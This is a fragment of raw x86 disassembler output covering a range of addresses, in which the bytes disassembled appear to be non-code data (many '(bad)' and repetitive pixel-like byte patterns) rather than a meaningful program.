  415002:	add    BYTE PTR [edi],dl
  415004:	add    BYTE PTR [eax],al
  415006:	add    BYTE PTR [edx],cl
	...
  415034:	stos   BYTE PTR es:[edi],al
  415035:	stos   BYTE PTR es:[edi],al
  415036:	stos   BYTE PTR es:[edi],al
  415037:	cs mov ebp,0xb7ffbdbd
  41503d:	mov    bh,0xb7
  41503f:	(bad)  
  415040:	mov    esi,0xc6ffbebe
  415045:	mov    dh,0xff
  415048:	iret   
  415049:	iret   
  41504a:	iret   
  41504b:	(bad)  
  41504c:	fcmovu st,st(2)
  41504e:	(bad)  
  415050:	fcmovnu st,st(3)
  415052:	(bad)  
  415054:	iret   
  415055:	iret   
  415056:	iret   
  415057:	inc    edi
  415059:	mov    edi,0xcacacaff
  41505f:	inc    esi
  415061:	mov    dh,0xff
  415064:	mov    ecx,0x9effb9b9
  415069:	sahf   
  41506a:	sahf   
  41506b:	dec    DWORD PTR [esi-0x36007172]
  415071:	leave  
  415072:	leave  
  415073:	jmp    DWORD PTR [ecx]
  415075:	and    DWORD PTR [ecx],esp
  415077:	jno    0x415079
  415079:	add    BYTE PTR [eax],al
  41507b:	and    DWORD PTR [eax],eax
  41507d:	add    BYTE PTR [eax],al
  41507f:	xor    al,BYTE PTR [eax]
  415081:	add    BYTE PTR [eax],al
  415083:	pop    ds
  415084:	add    BYTE PTR [eax],al
  415086:	add    BYTE PTR [edx],dl
	...
  4150b8:	(bad)
  4150bb:	loope  0x41508b
  4150bd:	into   
  4150be:	into   
  4150bf:	(bad)  
  4150c0:	mov    edi,0xbfffbfbf
  4150c5:	mov    edi,0xc9c9ffbf
  4150ca:	leave  
  4150cb:	call   eax
  4150cd:	rcl    al,1
  4150cf:	call   edx
  4150d1:	rcl    ah,cl
  4150d3:	dec    edi
  4150d5:	iret   
  4150d6:	iret   
  4150d7:	inc    esi
  4150d9:	mov    dh,0xff
  4150dc:	mov    esi,0xa2ffbebe
  4150e1:	mov    ds:0x8585ffa2,al
  4150e6:	test   edi,edi
  4150e8:	test   BYTE PTR [esp+eax*4-0x64646401],al
  4150ef:	call   DWORD PTR [ebp+0xef9595]
  4150f5:	add    BYTE PTR [eax],al
  4150f7:	pop    ss
  4150f8:	or     al,0xc
  4150fa:	or     al,0x18
  4150fc:	or     BYTE PTR [eax],cl
  4150fe:	or     DWORD PTR ds:0x13000000,edx
  415104:	add    BYTE PTR [eax],al
  415106:	add    BYTE PTR [eax+eax*1],cl
  415109:	add    BYTE PTR [eax],al
  41510b:	add    BYTE PTR [ecx],bh
  41510d:	cmp    edi,DWORD PTR [edx+ebx*1]
  415110:	push   ebp
  415111:	push   ebp
  415112:	push   edi
  415113:	enter  0x8789,0x87
  415117:	call   DWORD PTR [ecx+0x50]
  41511a:	push   eax
  41511b:	sahf   
  41511c:	add    DWORD PTR [ecx],eax
  41511e:	add    DWORD PTR [edx],edi
  415120:	add    BYTE PTR [eax],al
  415122:	add    BYTE PTR [esi],dh
  415124:	adc    edx,DWORD PTR [ebx]
  415126:	adc    esi,DWORD PTR [ecx+0x14]
  415129:	adc    al,0x14
  41512b:	fs inc ebx
  41512d:	inc    ebx
  41512e:	inc    ecx
  41512f:	or     eax,0x0
	...
  41513c:	mov    DWORD PTR [ecx-0x2c2c5c77],ecx
  415142:	aam    0xff
  415144:	retf   
  415145:	retf   
  415146:	retf   
  415147:	push   DWORD PTR [esi-0x4f004a4a]
  41514d:	mov    al,0xb0
  41514f:	jmp    FWORD PTR [edi-0x65005251]
  415155:	cdq    
  415156:	cdq    
  415157:	inc    DWORD PTR [ebx+0x6aff8384]
  41515d:	push   0x6a
  41515f:	call   DWORD PTR [ebx+0x52]
  415162:	push   edx
  415163:	jmp    DWORD PTR [edi+0x67]
  415166:	call   DWORD PTR [di-0x6c6d]
  41516b:	push   DWORD PTR [esp+esi*4-0x5e5b004b]
  415172:	mov    eax,ds:0xa4a2a5de
  415177:	fcmovnb st,st(3)
  415179:	ret    
  41517a:	(bad)  
  41517b:	call   FWORD PTR [edi+0x5f]
  41517e:	pop    ebp
  41517f:	pop    edx
  415180:	add    BYTE PTR [eax],al
  415182:	add    BYTE PTR [eax],al
  415184:	add    BYTE PTR [eax],al
  415186:	add    BYTE PTR ds:0x0,al
  41518c:	jge    0x41520a
  41518e:	jge    0x415158
  415190:	sahf   
  415191:	fwait
  415192:	cdq    
  415193:	push   DWORD PTR [edi-0x1f004e4e]
  415199:	loopne 0x41517c
  41519b:	call   FWORD PTR [ebx+0x47ff9b9b]
  4151a1:	inc    edi
  4151a2:	inc    edi
  4151a3:	sti    
  4151a4:	push   0xa5ff6868
  4151a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4151aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4151ab:	clc    
  4151ac:	lea    ecx,[ebp+0x1e1eda8b]
  4151b2:	sbb    eax,0x4d4c4c73
  4151b7:	push   cs
	...
  4151c0:	and    DWORD PTR [eax],esp
  4151c2:	push   ds
  4151c3:	dec    ecx
  4151c4:	jb     0x415238
  4151c6:	jo     0x415186
  4151c8:	fwait
  4151c9:	fwait
  4151ca:	fwait
  4151cb:	out    dx,al
  4151cc:	pushf  
  4151cd:	call   0xff75:0x7777ff99
  4151d4:	jae    0x415246
  4151d6:	jae    0x4151d7
  4151d8:	je     0x41524b
  4151da:	je     0x4151db
  4151dc:	add    BYTE PTR [ecx-0x6061007d],0xa1
  4151e3:	jmp    FWORD PTR [ebx-0x4800494e]
  4151e9:	(bad)  
  4151ea:	retf   
  4151eb:	inc    eax
  4151ed:	(bad)  
  4151ef:	dec    edi
  4151f1:	jmp    0xe51e51e2
  4151f6:	out    0xff,al
  4151f8:	rcl    ebx,cl
  4151fa:	aam    0xff
  4151fc:	pop    esi
  4151fd:	pop    esi
  4151fe:	pop    esi
  4151ff:	add    BYTE PTR [eax],0x0
	...
  41520a:	add    BYTE PTR [eax],al
  41520c:	lea    ecx,[ebp+ecx*4-0x4b484417]
  415213:	dec    DWORD PTR [esi-0x52007173]
  415219:	lods   eax,DWORD PTR ds:[esi]
  41521a:	scas   al,BYTE PTR es:[edi]
  41521b:	call   edx
  41521d:	aam    0xd2
  41521f:	inc    esp
  415221:	(bad)  
  415222:	(bad)  
  415223:	call   DWORD PTR [eax+0x52ec9190]
  415229:	push   edx
  41522a:	push   edx
  41522b:	mov    edx,0xc87a7979
  415230:	lods   al,BYTE PTR ds:[esi]
  415231:	lods   al,BYTE PTR ds:[esi]
  415232:	lods   eax,DWORD PTR ds:[esi]
  415233:	stc    
  415234:	mov    BYTE PTR [eax+0x2b2be68a],cl
  41523a:	sub    edi,DWORD PTR [ecx+0x0]
  41523d:	add    BYTE PTR [eax],al
  41523f:	or     al,BYTE PTR [eax]
  415241:	add    BYTE PTR [eax],al
  415243:	add    BYTE PTR [ebx],dh
  415245:	xor    DWORD PTR ds:0x6663631f,esi
  41524b:	test   BYTE PTR [edx-0x77026b71],cl
  415251:	xchg   ecx,eax
  415252:	cwde   
  415253:	dec    DWORD PTR [esp+ebx*4-0x5068005d]
  41525a:	mov    bh,0xff
  41525c:	mov    ecx,0xcbffd9d3
  415261:	in     al,0xe5
  415263:	call   eax
  415265:	fsubrp st(0),st
  415267:	call   ebp
  415269:	rcl    al,cl
  41526b:	call   esp
  41526d:	mov    cl,0xa7
  41526f:	call   ecx
  415271:	jl     0x4152ed
  415273:	dec    ebx
  415275:	mov    esp,0xc8bbffb6
  41527a:	enter  0x93ff,0x93
  41527e:	xchg   ecx,eax
  41527f:	cwde   
	...
  41528c:	xchg   DWORD PTR [ebp-0x453f267b],eax
  415292:	mov    ebx,0xa4a1a4ff
  415297:	jmp    FWORD PTR [ebp-0x51005354]
  41529d:	scas   al,BYTE PTR es:[edi]
  41529e:	lods   eax,DWORD PTR ds:[esi]
  41529f:	jmp    FWORD PTR [edx-0x30005657]
  4152a5:	iret   
  4152a6:	iret   
  4152a7:	call   edi
  4152a9:	xlat   BYTE PTR ds:[ebx]
  4152aa:	xlat   BYTE PTR ds:[ebx]
  4152ab:	dec    DWORD PTR [ebx+ecx*4+0x5153dd8c]
  4152b2:	push   edx
  4152b3:	loope  0x415239
  4152b5:	add    DWORD PTR [edi+edi*8-0xe919396],0xffffff8d
  4152bd:	xchg   esi,eax
  4152be:	call   0xb5ff:0xc7c2b1ed
  4152c5:	int    0xd4
  4152c7:	jmp    FWORD PTR [eax+ecx*8-0x34510032]
  4152ce:	int3   
  4152cf:	(bad)  
  4152d0:	mov    ebp,0xc5ffc8c6
  4152d5:	mov    bh,0xb5
  4152d7:	inc    edi
  4152d9:	lods   al,BYTE PTR ds:[esi]
  4152da:	stos   BYTE PTR es:[edi],al
  4152db:	dec    eax
  4152dd:	xchg   esi,eax
  4152de:	mov    ?,edi
  4152e0:	lds    ebp,FWORD PTR [ecx+0x59]
  4152e3:	(bad)  
  4152e4:	mov    ebx,0xafff1e2d
  4152e9:	add    eax,0xa3ff00
  4152ee:	add    bh,bh
  4152f0:	cdq    
  4152f1:	add    BYTE PTR [eax],al
  4152f3:	(bad)  
  4152f4:	mov    esp,0xc3ff848a
  4152f9:	loopne 0x4152df
  4152fb:	call   FWORD PTR [eax+0xb59494]
	...
  415309:	add    BYTE PTR [eax],al
  41530b:	add    BYTE PTR [edx+ecx*4-0x3b352375],cl
  415312:	(bad)  
  415315:	mov    ds:0xadacffa5,eax
  41531a:	scas   al,BYTE PTR es:[edi]
  41531b:	jmp    DWORD PTR [edx-0x6d005b5c]
  415321:	xchg   ecx,eax
  415322:	xchg   ecx,eax
  415323:	call   DWORD PTR [ecx+0x7fff928e]
  415329:	mov    WORD PTR [esi-0x514b6901],cs
  41532f:	(bad)  
  415330:	mov    ecx,0xd4ffd3ce
  415335:	out    dx,al
  415336:	hlt    
  415337:	(bad)  
  415338:	fdiv   st(3),st
  41533a:	std    
  41533b:	call   eax
  41533d:	loope  0x415322
  41533f:	inc    esi
  415341:	rol    al,0xff
  415344:	mov    esp,0xbbff9e9f
  415349:	jge    0x4153c0
  41534b:	push   DWORD PTR [ebp+ebx*2+0x35abff5d]
  415352:	xor    edi,edi
  415354:	mov    al,ds:0xa0ff000c
  415359:	add    BYTE PTR [eax],al
  41535b:	jmp    DWORD PTR [ecx-0x5d010000]
  415361:	add    BYTE PTR [eax],al
  415363:	jmp    DWORD PTR [ebx+ecx*1+0x1dabff00]
  41536a:	or     bh,bh
  41536c:	mov    dl,0x2c
  41536e:	sbb    bh,bh
  415370:	mov    bh,0x16
  415372:	add    bh,bh
  415374:	(bad)  
  415375:	mov    DWORD PTR [eax-0x15193901],eax
  41537b:	call   DWORD PTR [edx+0xcc8e8f]
	...
  415389:	add    BYTE PTR [eax],al
  41538b:	add    BYTE PTR [ecx-0x2d1f7173],dl
  415391:	int    0xcc
  415393:	jmp    DWORD PTR [esi-0x51005e5e]
  415399:	lods   al,BYTE PTR ds:[esi]
  41539a:	scas   eax,DWORD PTR es:[edi]
  41539b:	jmp    FWORD PTR [ecx-0x68005657]
  4153a1:	xchg   edi,eax
  4153a2:	xchg   edi,eax
  4153a3:	jmp    FWORD PTR [eax-0x58005359]
  4153a9:	mov    ch,0xb6
  4153ab:	inc    eax
  4153ad:	iret   
  4153ae:	retf   0xbaff
  4153b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4153b3:	push   DWORD PTR [eax-0x5d008d8c]
  4153b9:	push   eax
  4153ba:	push   edx
  4153bb:	call   FWORD PTR [eax-0x7100cccb]
  4153c1:	adc    DWORD PTR [eax],edx
  4153c3:	inc    DWORD PTR [ebp-0x7e010000]
  4153c9:	add    BYTE PTR [eax],al
  4153cb:	inc    DWORD PTR [ebx-0x7200feff]
  4153d1:	add    BYTE PTR [eax],al
  4153d3:	call   FWORD PTR [edx-0x5000fffe]
  4153d9:	xor    DWORD PTR ds:0x2b3db7ff,ebx
  4153df:	(bad)  
  4153e0:	mov    ebx,0xbfff293c
  4153e5:	aas    
  4153e6:	sub    eax,0x2d41c2ff
  4153eb:	inc    esi
  4153ed:	inc    ebx
  4153ee:	sub    al,0xff
  4153f0:	enter  0x1029,0xff
  4153f4:	int3   
  4153f5:	je     0x41545e
  4153f7:	inc    esi
  4153f9:	jmp    0x93d953eb
  4153fe:	xchg   edx,eax
  4153ff:	(bad)  
	...
  41540c:	xchg   ebx,eax
  41540d:	(bad)  
  41540e:	xchg   edx,eax
  41540f:	loope  0x4153eb
  415411:	rcl    dl,cl
  415413:	jmp    DWORD PTR [esi-0x53005a5c]
  415419:	scas   al,BYTE PTR es:[edi]
  41541a:	scas   eax,DWORD PTR es:[edi]
  41541b:	jmp    FWORD PTR [edx+ebp*4-0x63630054]
  415422:	pushf  
  415423:	inc    edx
  415425:	rcl    edi,cl
  415427:	call   DWORD PTR [eax-0x7100bbbd]
  41542d:	adc    al,0x17
  41542f:	dec    DWORD PTR [esp+ecx*1+0x7cff05]
  415436:	add    bh,bh
  415438:	je     0x41543a
  41543a:	add    bh,bh
  41543c:	jne    0x41543e
  41543e:	add    bh,bh
  415440:	jnp    0x415442
  415442:	add    bh,bh
  415444:	mov    DWORD PTR [ebx],eax
  415446:	add    bh,bh
  415448:	ja     0x41546c
  41544a:	sbb    edi,edi
  41544c:	outs   dx,DWORD PTR ds:[esi]
  41544d:	sub    esp,DWORD PTR [edx]
  41544f:	call   FWORD PTR [ecx-0x5200fff0]
  415455:	sbb    BYTE PTR [ecx],al
  415457:	inc    eax
  415459:	dec    eax
  41545a:	cmp    edi,edi
  41545c:	lds    ecx,FWORD PTR [ebp+edi*1-0x1]
  415460:	retf   0x3a4b
  415463:	dec    esi
  415465:	dec    edi
  415466:	cmp    al,0xff
  415468:	rcl    DWORD PTR [edx+0x3e],1
  41546b:	call   esp
  41546d:	push   esi
  41546e:	inc    ecx
  41546f:	call   esi
  415471:	inc    esp
  415472:	sub    eax,0x5367d2ff
  415477:	dec    edx
  415479:	out    0xeb,al
  41547b:	call   FWORD PTR [ebp-0x6c196162]
  415481:	xchg   ebx,eax
  415482:	xchg   ebx,eax
  415483:	adc    al,BYTE PTR [eax]
  415485:	add    BYTE PTR [eax],al
  415487:	add    BYTE PTR [eax],al
  415489:	add    BYTE PTR [eax],al
  41548b:	add    BYTE PTR [ecx-0x211e6d6f],dl
  415491:	(bad)  
  415492:	fdivr  st,st(7)
  415494:	test   al,0xa6
  415496:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415497:	jmp    FWORD PTR [esi-0x4e005150]
  41549d:	mov    al,0xb1
  41549f:	jmp    DWORD PTR [eax-0x38005f60]
  4154a5:	fcmovu st,st(7)
  4154a7:	inc    DWORD PTR [ecx+0x7fff272b]
  4154ad:	add    BYTE PTR [eax],al
  4154af:	dec    DWORD PTR [ebp-0x7400f6eb]
  4154b5:	sbb    BYTE PTR [edi],cl
  4154b7:	dec    DWORD PTR [ebx-0x7600f3e9]
  4154bd:	adc    BYTE PTR ds:0x1090ff,al
  4154c3:	(bad)  
  4154c4:	jns    0x4154ea
  4154c6:	sbb    bh,bh
  4154c8:	mov    cl,0xa7
  4154ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4154cb:	push   DWORD PTR [esp+esi*4+0x1e76ffb4]
  4154d2:	push   ss
  4154d3:	push   DWORD PTR [ebp-0x2e00f4e2]
  4154d9:	gs push edx
  4154db:	call   ebx
  4154dd:	fs push edx
  4154df:	call   edi
  4154e1:	bound  ecx,QWORD PTR [esi-0x1]
  4154e4:	fisub  DWORD PTR [eax+edx*2-0x1]
  4154e8:	frstor [edi+0x52]
  4154eb:	jmp    eax
  4154ed:	imul   edx,DWORD PTR [ebp-0x1],0xff475fe6
  4154f4:	in     al,0x68
  4154f6:	push   edx
  4154f7:	call   eax
  4154f9:	in     eax,0xe6
  4154fb:	jmp    DWORD PTR [edx-0x6b005658]
  415501:	nop
  415502:	nop
  415503:	add    BYTE PTR cs:[eax],al
  415506:	add    BYTE PTR [eax],al
  415508:	add    BYTE PTR [eax],al
  41550a:	add    BYTE PTR [eax],al
  41550c:	xchg   ebx,eax
  41550d:	nop
  41550e:	xchg   edx,eax
  41550f:	loope  0x4154ef
  415511:	aam    0xd5
  415513:	jmp    DWORD PTR [ebp-0x4f005b5d]
  415519:	scas   eax,DWORD PTR es:[edi]
  41551a:	scas   eax,DWORD PTR es:[edi]
  41551b:	push   DWORD PTR [esp+esi*4-0x5959004b]
  415522:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415523:	inc    ebx
  415525:	rcl    dl,1
  415527:	dec    DWORD PTR [edi-0x7100a7a3]
  41552d:	adc    ecx,DWORD PTR [eax]
  41552f:	call   FWORD PTR [eax-0x6c00d6d1]
  415535:	daa    
  415536:	and    bh,bh
  415538:	xchg   edx,eax
  415539:	sub    BYTE PTR ds:0x71391ff,bl
  41553f:	(bad)  
  415540:	js     0x41555f
  415542:	pop    ss
  415543:	inc    ebp
  415545:	mov    bh,0xb5
  415547:	(bad)  
  415548:	(bad)  
  41554a:	(bad)  
  41554c:	(bad)
  41554f:	call   FWORD PTR [ebp-0x5c007878]
  415555:	sub    edx,DWORD PTR [esi]
  415557:	(bad)  
  415558:	fnstsw WORD PTR [edx+0x6b]
  41555b:	(bad)  
  41555c:	fnsave [edx+eiz*2-0x1]
  415560:	loopne 0x4155d6
  415562:	(bad)  
  415563:	jmp    ebx
  415565:	ja     0x4155ca
  415567:	jmp    esi
  415569:	js     0x4155cf
  41556b:	(bad)  
  41556c:	jmp    0xec40bdec
  415571:	ja     0x4155d1
  415573:	(bad)  
  415574:	in     al,dx
  415575:	jo     0x4155d1
  415577:	call   ebx
  415579:	fsubrp st(1),st
  41557b:	jmp    FWORD PTR [ecx-0x6d004d4f]
  415581:	xchg   ecx,eax
  415582:	xchg   ecx,eax
  415583:	dec    ecx
	...
  41558c:	xchg   edx,eax
  41558d:	mov    ss,WORD PTR [eax-0x32322e1f]
  415593:	call   FWORD PTR [ebp-0x4d006465]
  415599:	mov    cl,0xb1
  41559b:	(bad)  
  41559c:	mov    edi,0xb3ffc0c0
  4155a1:	mov    bl,0xb3
  4155a3:	dec    eax
  4155a5:	rcl    ebx,1
  4155a7:	call   FWORD PTR [edx-0x7100868a]
  4155ad:	sbb    dl,BYTE PTR [ecx]
  4155af:	call   FWORD PTR [esi-0x6400cdc6]
  4155b5:	cmp    dh,BYTE PTR [esi]
  4155b7:	call   DWORD PTR [edi+0x7cff2731]
  4155bd:	das    
  4155be:	sub    bh,bh
  4155c0:	xlat   BYTE PTR ds:[ebx]
  4155c1:	int3   
  4155c2:	retf   
  4155c3:	push   esi
  4155c5:	div    dh
  4155c7:	call   FWORD PTR [ebx-0x4a00a49d]
  4155cd:	xchg   ecx,eax
  4155ce:	mov    edi,edi
  4155d0:	(bad)  
  4155d2:	(bad)  
  4155d4:	nop
  4155d5:	pusha  
  4155d6:	pop    eax
  4155d7:	jmp    edx
  4155d9:	pop    DWORD PTR [edx+0x7485e6ff]
  4155df:	(bad)  
  4155e0:	jmp    0xec40cb6c
  4155e5:	mov    DWORD PTR [edi-0x1],esi
  4155e8:	out    dx,al
  4155e9:	mov    bh,BYTE PTR [ecx-0x1]
  4155ec:	lock lea edi,[edx-0x1]
  4155f0:	repz (bad) 
  4155f2:	jns    0x4155f3
  4155f4:	hlt    
  4155f5:	js     0x41565a
  4155f7:	call   ebp
  4155f9:	rcl    cl,cl
  4155fb:	jmp    FWORD PTR [ebp-0x6e004143]
  415601:	mov    cs,WORD PTR [ebp+0x5d]
  415607:	add    BYTE PTR [eax],al
  415609:	add    BYTE PTR [eax],al
  41560b:	add    BYTE PTR [ecx-0x331e6d72],dl
  415611:	mov    ah,0xbe
  415613:	call   DWORD PTR [ebp-0x4900757d]
  415619:	mov    edx,0xcbcbffb7
  41561e:	retf   
  41561f:	(bad)  
  415620:	mov    ebx,0xc6ffbbba
  415625:	retf   
  415626:	int    0xff
  415628:	lahf   
  415629:	xchg   edx,eax
  41562a:	xchg   esp,eax
  41562b:	dec    DWORD PTR [edi-0x5900e5df]
  415631:	dec    ecx
  415632:	inc    ebx
  415633:	jmp    FWORD PTR [ebx-0x5b00b3ab]
  415639:	dec    ecx
  41563a:	inc    ecx
  41563b:	call   esp
  41563d:	int3   
  41563e:	int3   
  41563f:	(bad)  
  415640:	out    dx,al
  415641:	in     al,dx
  415642:	jmp    0x415643
  415644:	xchg   ebx,eax
  415645:	dec    esi
  415646:	inc    ebp
  415647:	jmp    FWORD PTR [ebp-0x5200fce8]
  41564d:	ss and edi,edi
  415650:	out    0xdf,eax
  415652:	(bad)  
  415654:	fcom   st(6)
  415656:	(bad)  
  415657:	jmp    DWORD PTR [edi-0x11008a83]
  41565d:	cwde   
  41565e:	xchg   edi,edi
  415660:	lock cdq 
  415662:	mov    edi,edi
  415664:	repz fwait
  415666:	mov    bh,bh
  415668:	neg    BYTE PTR [ebp-0x61080074]
  41566e:	(bad)  
  41566f:	(bad)  
  415670:	cli    
  415671:	mov    ds:0x89fcff91,al
  415676:	jb     0x415677
  415678:	loope  0x41563e
  41567a:	mov    edi,0xd0ccb7ff
  41567f:	call   DWORD PTR [ecx+0x678d8d]
  415685:	add    BYTE PTR [eax],al
  415687:	add    BYTE PTR [eax],al
  415689:	add    BYTE PTR [eax],al
  41568b:	add    BYTE PTR [edi-0x501e757f],cl
  415691:	stos   BYTE PTR es:[edi],al
  415692:	test   al,0xff
  415694:	xchg   ecx,eax
  415695:	fwait
  415696:	xchg   ebp,eax
  415697:	(bad)  
  415698:	mov    ebp,0xcdffbbb4
  41569d:	ror    dh,1
  41569f:	(bad)  
  4156a0:	mov    edi,0xc1ffbfbd
  4156a5:	(bad)
  4156a8:	mov    al,0xb6
  4156aa:	mov    edx,0x212a8eff
  4156af:	jmp    FWORD PTR [esi-0x4c00b0aa]
  4156b5:	pusha  
  4156b6:	push   edi
  4156b7:	call   DWORD PTR [ebp-0x5b00ede7]
  4156bd:	push   eax
  4156be:	dec    edx
  4156bf:	call   DWORD PTR [esi+esi*1+0x16aaff28]
  4156c6:	add    edi,edi
  4156c8:	mov    bh,0x17
  4156ca:	add    bh,bh
  4156cc:	rcr    BYTE PTR [ecx],0x1
  4156cf:	push   DWORD PTR [ebx-0x9a98]
  4156d5:	(bad)  
  4156d6:	(bad)  
  4156d7:	(bad)  
  4156d8:	mov    ecx,0xcbffaeb0
  4156dd:	mov    edi,DWORD PTR [edi-0x1]
  4156e0:	cmc    
  4156e1:	test   al,0x99
  4156e3:	(bad)  
  4156e4:	clc    
  4156e5:	stos   BYTE PTR es:[edi],al
  4156e6:	fwait
  4156e7:	(bad)  
  4156e8:	cli    
  4156e9:	lods   eax,DWORD PTR ds:[esi]
  4156ea:	pushf  
  4156eb:	(bad)  
  4156ec:	std    
  4156ed:	scas   al,BYTE PTR es:[edi]
  4156ee:	popf   
  4156ef:	(bad)  
  4156f0:	push   DWORD PTR [ecx-0x6600005b]
  4156f6:	cmp    edi,0xffffffed
  4156f9:	mov    edi,0xd0bcffb7
  4156fe:	fdivr  st,st(7)
  415700:	xchg   ecx,eax
  415701:	mov    cs,WORD PTR [ebp+0x81]
  415707:	add    BYTE PTR [eax],al
  415709:	add    BYTE PTR [eax],al
  41570b:	add    BYTE PTR [esi-0x72],dh
  41570e:	sbb    ebp,0x15
  415711:	repnz test edi,edi
  415714:	dec    ebx
  415715:	(bad)  
  415716:	mov    ?,edi
  415718:	fild   QWORD PTR [eax-0x282e003c]
  41571e:	aam    0xff
  415720:	(bad)
  415723:	inc    edi
  415725:	enter  0xffc9,0xba
  415729:	retf   0xffce
  41572c:	xchg   ecx,eax
  41572d:	xor    DWORD PTR ds:0x6067b8ff,ebp
  415733:	push   DWORD PTR [eax-0x6f00b6ae]
  415739:	add    BYTE PTR [eax],al
  41573b:	jmp    DWORD PTR [ebx+edx*1+0x15aaff00]
  415742:	add    bh,bh
  415744:	mov    ah,0x18
  415746:	add    bh,bh
  415748:	ret    0x1c
  41574b:	dec    ecx
  41574d:	sbb    al,BYTE PTR [eax]
  41574f:	inc    ebp
  415751:	pop    ds
  415752:	push   cs
  415753:	call   ebp
  415755:	mov    bl,0xff
  415758:	std    
  415759:	std    
  41575a:	std    
  41575b:	jmp    FWORD PTR [eax-0xd007471]
  415761:	mov    cl,0xa3
  415763:	(bad)  
  415764:	std    
  415765:	mov    ebx,0xbdfeffac
  41576a:	lods   eax,DWORD PTR ds:[esi]
  41576b:	(bad)  
  41576c:	(bad)  
  41576d:	mov    edi,0xc3ffffae
  415772:	mov    dh,0xff
  415774:	push   DWORD PTR [edx-0x3d0f0066]
  41577a:	mov    ch,0xff
  41577c:	rcl    ah,0xda
  41577f:	call   DWORD PTR [eax+0xb98b8d]
  415785:	add    BYTE PTR [eax],al
  415787:	add    BYTE PTR [eax],al
  415789:	add    BYTE PTR [eax],al
  41578b:	add    BYTE PTR [eax-0x7f],ch
  41578e:	jbe    0x415768
  415790:	add    BYTE PTR [ebx+0x39],bh
  415793:	jmp    DWORD PTR [edx+0x78]
  415796:	imul   edi,edi,0xffd0c4d8
  41579c:	xlat   BYTE PTR ds:[ebx]
  41579d:	(bad)  
  41579f:	dec    edx
  4157a1:	retf   0xffca
  4157a4:	int    0xcd
  4157a6:	into   
  4157a7:	(bad)  
  4157a8:	mov    esp,0x93ffd1ce
  4157ad:	xor    al,0x31
  4157af:	(bad)  
  4157b0:	mov    esi,0xa2ff6870
  4157b5:	sub    esp,DWORD PTR [eax]
  4157b7:	call   FWORD PTR [ebx-0x5100ffff]
  4157bd:	sbb    BYTE PTR [eax],al
  4157bf:	(bad)  
  4157c0:	mov    esi,0xcaff0019
  4157c5:	sbb    eax,0x24d6ff00
  4157ca:	add    bh,bh
  4157cc:	loopne 0x4157e4
  4157ce:	add    bh,bh
  4157d0:	lock sub al,0x4
  4157d3:	call   ebp
  4157d5:	lods   eax,DWORD PTR ds:[esi]
  4157d6:	mov    ds:0xdcdde0ff,eax
  4157db:	jmp    eax
  4157dd:	loopne 0x4157bf
  4157df:	jmp    DWORD PTR [edi-0x7d76]
  4157e5:	into   
  4157e6:	mov    ebx,0xbcccffff
  4157eb:	(bad)  
  4157ec:	dec    edi
  4157ee:	mov    ebp,0xc5d5ffff
  4157f3:	(bad)  
  4157f4:	dec    ecx
  4157f6:	mov    cl,0xff
  4157f8:	hlt    
  4157f9:	ret    
  4157fa:	lods   eax,DWORD PTR ds:[esi]
  4157fb:	inc    ebp
  4157fd:	aam    0xdc
  4157ff:	call   DWORD PTR [ecx-0x681f7071]
  415805:	xchg   edi,eax
  415806:	xchg   edi,eax
  415807:	or     eax,DWORD PTR [eax]
  415809:	add    BYTE PTR [eax],al
  41580b:	add    BYTE PTR [edx+ebp*2+0x71],dh
  41580f:	in     al,0x47
  415811:	es sub eax,0x675f7aff
  415817:	inc    eax
  415819:	mov    bh,0xff
  41581c:	xlat   BYTE PTR ds:[ebx]
  41581d:	fcomp  st(0)
  41581f:	inc    ebx
  415821:	ret    
  415822:	ret    
  415823:	call   eax
  415825:	rcl    cl,1
  415827:	(bad)  
  415828:	mov    esi,0x95ffd3d0
  41582d:	inc    edx
  41582e:	cmp    eax,0x5461b7ff
  415833:	call   FWORD PTR [ecx+ecx*1+0xfaaff00]
  41583a:	add    bh,bh
  41583c:	mov    bh,0x19
  41583e:	add    bh,bh
  415840:	les    ebx,FWORD PTR [eax+eax*1]
  415843:	call   eax
  415845:	and    BYTE PTR [eax],al
  415847:	(bad)  
  415848:	(bad)  [esi]
  41584a:	add    bh,bh
  41584c:	out    0xe,eax
  41584e:	add    bh,bh
  415850:	hlt    
  415851:	dec    edx
  415852:	sub    bh,bh
  415854:	(bad)  
  415855:	loopne 0x41582f
  415857:	inc    esp
  415859:	scas   al,BYTE PTR es:[edi]
  41585a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41585b:	(bad)  
  41585c:	(bad)  
  41585e:	fdivp  st(7),st
  415860:	mov    esi,0xbdffbabb
  415865:	mov    eax,ds:0xd8ffff96
  41586a:	enter  0xffff,0xd9
  41586e:	leave  
  41586f:	(bad)  
  415870:	(bad)  
  415871:	fcmovne st,st(6)
  415873:	(bad)  
  415874:	(bad)  
  415875:	fadd   st,st(3)
  415877:	(bad)  
  415878:	stc    
  415879:	ret    0xffa9
  41587c:	retf   
  41587d:	xlat   BYTE PTR ds:[ebx]
  41587e:	(bad)  
  415880:	xchg   ebx,eax
  415881:	xchg   esi,eax
  415882:	xchg   edi,eax
  415883:	not    BYTE PTR [esi+0x189596]
  415889:	add    BYTE PTR [eax],al
  41588b:	add    BYTE PTR [esi+0x7a9e8d8b],cl
  415891:	je     0x41590a
  415893:	jmp    FWORD PTR [ebp-0xa005354]
  415899:	idiv   cl
  41589b:	(bad)  
  41589c:	(bad)  
  41589d:	(bad)  
  41589e:	(bad)  
  41589f:	jmp    ecx
  4158a1:	loope  0x415884
  4158a3:	call   edi
  4158a5:	xlat   BYTE PTR ds:[ebx]
  4158a6:	xlat   BYTE PTR ds:[ebx]
  4158a7:	inc    ecx
  4158a9:	rcl    bh,cl
  4158ab:	call   FWORD PTR [ebx-0x5e00aca8]
  4158b1:	sub    BYTE PTR [ecx],bl
  4158b3:	call   FWORD PTR [edi-0x5000fffc]
  4158b9:	pop    ss
  4158ba:	add    bh,bh
  4158bc:	mov    ebx,0xc7ff001a
  4158c1:	sbb    eax,0x20d3ff00
  4158c6:	add    bh,bh
  4158c8:	fbld   TBYTE PTR [esi]
  4158ca:	add    bh,bh
  4158cc:	jmp    0x4158d7
  4158ce:	add    bh,bh
  4158d0:	sti    
  4158d1:	ja     0x415930
